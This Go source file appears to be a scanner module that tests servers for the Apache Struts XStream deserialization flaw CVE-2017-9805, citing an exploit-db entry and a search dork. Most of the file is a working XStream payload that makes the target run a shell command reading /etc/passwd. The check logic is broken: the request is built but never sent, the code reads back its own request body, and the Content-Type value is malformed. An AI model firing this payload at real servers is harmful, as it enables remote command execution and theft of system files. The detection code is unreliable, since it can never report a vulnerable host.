package apache

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"uscan/modules/handling"

	"github.com/fatih/color"
)

// Google Dork: filetype:action
// Exploit url https://www.exploit-db.com/exploits/42627
// CVE: CVE-2017-9805

func CVE_9805(url string, userAgent string) {
	stringData := `<map>
	<entry>
	<jdk.nashorn.internal.objects.NativeString>
	<flags>0</flags>
	<value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
	<dataHandler>
	<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
	<is class="javax.crypto.CipherInputStream">
	<cipher class="javax.crypto.NullCipher">
	<initialized>false</initialized>
	<opmode>0</opmode>
	<serviceIterator class="javax.imageio.spi.FilterIterator">
	<iter class="javax.imageio.spi.FilterIterator">
	<iter class="java.util.Collections$EmptyIterator"/>
	<next class="java.lang.ProcessBuilder">
	<command>
	<string>/bin/sh</string><string>-c</string><string>cat /etc/passwd</string>
	</command>
	<redirectErrorStream>false</redirectErrorStream>
	</next>
	</iter>
	<filter class="javax.imageio.ImageIO$ContainsFilter">
	<method>
	<class>java.lang.ProcessBuilder</class>
	<name>start</name>
	<parameter-types/>
	</method>
	<name>foo</name>
	</filter>
	<next class="string">foo</next>
	</serviceIterator>
	<lock/>
	</cipher>
	<input class="java.lang.ProcessBuilder$NullInputStream"/>
	<ibuffer/>
	<done>false</done>
	<ostart>0</ostart>
	<ofinish>0</ofinish>
	<closed>false</closed>
	</is>
	<consumed>false</consumed>
	</dataSource>
	<transferFlavors/>
	</dataHandler>
	<dataLen>0</dataLen>
	</value>
	</jdk.nashorn.internal.objects.NativeString>
	<jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
	</entry>
	<entry>
	<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
	<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
	</entry>
	</map>`
	req, err := http.NewRequest("POST", url+"/orders/3", bytes.NewBufferString(stringData))
	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Content-Type", "Content-Type: application/xml")

	body, bodyerr := ioutil.ReadAll(req.Body)
	handling.ErrCheck(err, bodyerr)

	sb := string(body)

	if strings.Contains(sb, "root:x:0:0:root:/root:/bin/bash") {
		fmt.Println("Apache2 Struts 2.5 - 2.5.12 REST Plugin XStream " + color.GreenString(">> ") + "CVE-2017-9805 " + color.GreenString("Vuln"))
	} else {
		fmt.Println("Apache2 Struts 2.5 - 2.5.12 REST Plugin XStream " + color.GreenString(">> ") + "CVE-2017-9805 " + color.RedString("Not vuln"))
	}

}
